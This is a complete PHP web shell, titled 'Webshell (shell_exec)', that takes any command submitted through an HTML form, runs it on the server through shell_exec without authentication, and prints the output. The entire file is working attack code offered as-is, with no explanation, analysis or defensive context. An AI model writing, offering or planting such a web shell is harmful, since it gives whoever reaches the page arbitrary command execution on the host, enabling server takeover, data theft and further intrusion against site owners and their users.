<?php
if (isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $output = '';

    if (function_exists('shell_exec')) {
        $output = shell_exec($command);
    } else {
        $output = "The 'shell_exec' function is not enabled.";
    }

    echo $output;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Webshell (shell_exec)</title>
</head>
<body>
    <form method="POST" action="">
        <input type="text" name="cmd" placeholder="Enter a command">
        <input type="submit" value="Send">
    </form>
</body>
</html>

